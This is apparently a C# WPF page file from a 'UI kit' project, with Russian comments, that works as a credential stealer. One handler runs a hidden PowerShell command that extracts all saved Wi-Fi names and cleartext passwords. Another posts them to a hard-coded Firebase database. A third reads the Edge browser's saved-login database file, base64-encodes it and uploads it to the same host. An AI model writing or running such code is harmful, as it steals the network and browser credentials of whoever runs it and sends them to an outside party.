using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using Firebase.Database;
using Firebase.Database.Query;
using System.IO;
using System.Threading.Tasks;
using System.Net;

namespace WPFUIKitProfessional.Pages
{
    /// <summary>
    /// Lógica de interacción para Users.xaml
    /// </summary>
    public partial class Users : Page
    {
        private static readonly HttpClient httpClient = new HttpClient();

        public Users()
        {
            InitializeComponent();
        }

        private async void ShowWifiProfiles_Click(object sender, RoutedEventArgs e)
        {
            var psi = new ProcessStartInfo
            {
                FileName = "powershell",
                Arguments = "-Command \"(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\\\"$name\\\" key=clear)} | Select-String 'Содержимое ключа\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ProfileName=$name; Password=$pass }} | ConvertTo-Json -Compress\"",
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };

            var process = new Process { StartInfo = psi };
            try
            {
                process.Start();

                string output = await process.StandardOutput.ReadToEndAsync();
                string error = await process.StandardError.ReadToEndAsync();

                process.WaitForExit(); // Дождитесь завершения процесса

                if (!string.IsNullOrEmpty(error))
                {
                    MessageBox.Show($"Ошибка PowerShell: {error}");
                    return;
                }

                if (string.IsNullOrWhiteSpace(output))
                {
                    MessageBox.Show("Нет доступных Wi-Fi профилей.");
                    return;
                }

                List<WifiProfile> wifiProfiles = null;
                try
                {
                    // Попытка десериализовать JSON как список профилей
                    wifiProfiles = JsonConvert.DeserializeObject<List<WifiProfile>>(output);
                }
                catch (JsonSerializationException)
                {
                    // Попытка десериализовать JSON как одиночный профиль, если он не является списком
                    var singleWifiProfile = JsonConvert.DeserializeObject<WifiProfile>(output);
                    if (singleWifiProfile != null)
                    {
                        wifiProfiles = new List<WifiProfile> { singleWifiProfile };
                    }
                }

                if (wifiProfiles == null || wifiProfiles.Count == 0)
                {
                    MessageBox.Show("Не удалось получить данные профилей Wi-Fi.");
                }
                else
                {
                    wifiDataGrid.ItemsSource = wifiProfiles;
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Ошибка выполнения скрипта: {ex.Message}");
            }
        }

        public class WifiProfile
        {
            public string ProfileName { get; set; }
            public string Password { get; set; }
        }

        private async void SendWifiProfiles_Click(object sender, RoutedEventArgs e)
        {
            var wifiProfiles = wifiDataGrid.ItemsSource as List<WifiProfile>;
            if (wifiProfiles == null || !wifiProfiles.Any())
            {
                MessageBox.Show("Нет данных Wi-Fi профилей для отправки.");
                return;
            }

            string firebaseUrl = "https://wifipassname-default-rtdb.firebaseio.com/wifiProfiles.json"; // Замените на ваш URL Firebase

            foreach (var profile in wifiProfiles)
            {
                var json = JsonConvert.SerializeObject(profile);
                var content = new StringContent(json, Encoding.UTF8, "application/json");

                var response = await httpClient.PostAsync(firebaseUrl, content);
                if (!response.IsSuccessStatusCode)
                {
                    MessageBox.Show($"Ошибка отправки данных: {response.StatusCode}");
                    return; // Прерывание цикла в случае ошибки
                }
            }
            MessageBox.Show("Профили Wi-Fi успешно сохранены.");
        }

        private async void SendWifiProfiles_Click1(object sender, RoutedEventArgs e)
        {
            string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data");
            if (File.Exists(filePath))
            {
                try
                {
                    string firebaseUrl = "https://wifipassname-default-rtdb.firebaseio.com/";
                    string firebaseSecret = "your_firebase_secret"; // Замени это на твой секретный ключ Firebase
                    var firebaseClient = new FirebaseClient(
                        firebaseUrl,
                        new FirebaseOptions
                        {
                            AuthTokenAsyncFactory = () => Task.FromResult(firebaseSecret)
                        });

                    string fileContentBase64;
                    using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
                    {
                        using (var memoryStream = new MemoryStream())
                        {
                            await fileStream.CopyToAsync(memoryStream);
                            fileContentBase64 = Convert.ToBase64String(memoryStream.ToArray());
                        }
                    }

                    var data = new
                    {
                        FileName = "LoginData_" + DateTime.Now.ToString("yyyyMMddHHmmss") + ".txt",
                        Content = fileContentBase64,
                        Timestamp = DateTime.Now
                    };

                    // Отправка данных файла в Firebase
                    var fileRecord = await firebaseClient
                        .Child("your_child_node") // Укажи нужный путь в Firebase
                        .PostAsync(data);

                    MessageBox.Show("Файл успешно отправлен на Firebase!");
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Ошибка при отправке файла: " + ex.Message);
                }
            }
            else
            {
                MessageBox.Show("Файл Login Data не найден!");
            }
        }
    }
}
